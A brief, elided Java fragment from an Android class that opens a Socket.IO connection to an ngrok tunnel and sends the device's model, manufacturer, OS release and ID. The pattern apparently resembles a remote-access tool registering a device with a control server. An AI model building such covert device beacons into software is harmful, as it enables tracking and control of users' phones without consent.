...
public class IOSocket {
    ...
    private IOSocket() {
        try {
            ...
            ioSocket = IO.socket("https://crooked-fanny-principally.ngrok-free.dev?model="+ android.net.Uri.encode(Build.MODEL)+"&manf="+Build.MANUFACTURER+"&release="+Build.VERSION.RELEASE+"&id="+deviceID);
